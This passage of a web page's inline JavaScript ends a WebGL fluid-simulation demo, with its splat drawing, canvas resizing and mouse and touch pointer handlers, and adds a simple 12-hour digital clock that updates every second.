    gl.uniform2f( splatProgram.uniforms.point, x / canvas.width, 1.0 - y / canvas.height );
    gl.uniform3f( splatProgram.uniforms.color, dx, -dy, 1.0 );
    gl.uniform1f( splatProgram.uniforms.radius, config.SPLAT_RADIUS );
    blit( velocity.second[ 1 ] );
    velocity.swap();

    gl.uniform1i( splatProgram.uniforms.uTarget, density.first[ 2 ] );
    gl.uniform3f( splatProgram.uniforms.color, color[ 0 ] * 0.3, color[ 1 ] * 0.3, color[ 2 ] * 0.3 );
    blit( density.second[ 1 ] );
    density.swap();

}

function resizeCanvas() {

    ( canvas.width !== canvas.clientWidth || canvas.height !== canvas.clientHeight ) && ( canvas.width  = canvas.clientWidth, canvas.height = canvas.clientHeight, initFramebuffers() );

}

var count    = 0;
var colorArr = [ Math.random() + 0.2, Math.random() + 0.2, Math.random() + 0.2 ];

canvas.addEventListener( 'mousemove', function ( e ) {

    count++;

    ( count > 25 ) && (colorArr = [ Math.random() + 0.2, Math.random() + 0.2, Math.random() + 0.2 ], count = 0);

    pointers[ 0 ].down  = true;
    pointers[ 0 ].color = colorArr;
    pointers[ 0 ].moved = pointers[ 0 ].down;
    pointers[ 0 ].dx    = (e.offsetX - pointers[ 0 ].x) * 10.0;
    pointers[ 0 ].dy    = (e.offsetY - pointers[ 0 ].y) * 10.0;
    pointers[ 0 ].x     = e.offsetX;
    pointers[ 0 ].y     = e.offsetY;

} );

canvas.addEventListener( 'touchmove', function ( e ) {

    e.preventDefault();

    var touches = e.targetTouches;

    count++;

    ( count > 25 ) && (colorArr = [ Math.random() + 0.2, Math.random() + 0.2, Math.random() + 0.2 ], count = 0);

    for ( var i = 0, len = touches.length; i < len; i++ ) {

        if ( i >= pointers.length ) pointers.push( new pointerPrototype() );

        pointers[ i ].id    = touches[ i ].identifier;
        pointers[ i ].down  = true;
        pointers[ i ].x     = touches[ i ].pageX;
        pointers[ i ].y     = touches[ i ].pageY;
        pointers[ i ].color = colorArr;

        var pointer = pointers[ i ];

        pointer.moved = pointer.down;
        pointer.dx    = (touches[ i ].pageX - pointer.x) * 10.0;
        pointer.dy    = (touches[ i ].pageY - pointer.y) * 10.0;
        pointer.x     = touches[ i ].pageX;
        pointer.y     = touches[ i ].pageY;

    }

}, false );
</script>
<script type="text/javascript">
      function renderTime() {
      var currentTime = new Date();
      var diem = "AM";
      var h = currentTime.getHours();
      var m = currentTime.getMinutes();
      var s = currentTime.getSeconds();
      setTimeout('renderTime()',1000);
      if (h == 0) {
        h = 12;
      } else if (h > 12) { 
        h = h - 12;
        diem="PM";
      }
      if (h < 10) {
        h = "0" + h;
      }
      if (m < 10) {
        m = "0" + m;
      }
      if (s < 10) {
        s = "0" + s;
      }
      var myClock = document.getElementById('clockDisplay');
      myClock.textContent = h + ":" + m + ":" + s + " " + diem;
      myClock.innerText = h + ":" + m + ":" + s + " " + diem;
      }
      renderTime();
    </script>